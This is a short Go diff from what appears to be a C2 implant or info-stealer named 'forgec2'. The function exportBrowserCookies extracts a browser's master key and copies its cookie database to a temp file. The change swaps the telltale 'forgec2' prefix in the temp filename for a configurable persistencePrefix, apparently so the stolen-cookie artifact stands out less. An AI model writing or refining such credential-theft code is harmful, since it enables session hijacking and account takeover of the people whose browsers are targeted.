@@ -79,7 +79,7 @@ func exportBrowserCookies(store browserCookieStore) string {
 		return fmt.Sprintf("=== %s COOKIES ===\nmaster key error: %v\n", store.Name, err)
 	}
 
-	tmpCopy := filepath.Join(os.TempDir(), fmt.Sprintf("forgec2_%x_cookies_%s.db", randNonce(), strings.ToLower(store.Name)))
+	tmpCopy := filepath.Join(os.TempDir(), fmt.Sprintf("%s_%x_cookies_%s.db", persistencePrefix, randNonce(), strings.ToLower(store.Name)))
 	data, err := os.ReadFile(cookieDB)
 	if err != nil {
 		return fmt.Sprintf("=== %s COOKIES ===\nread error: %v\n", store.Name, err)
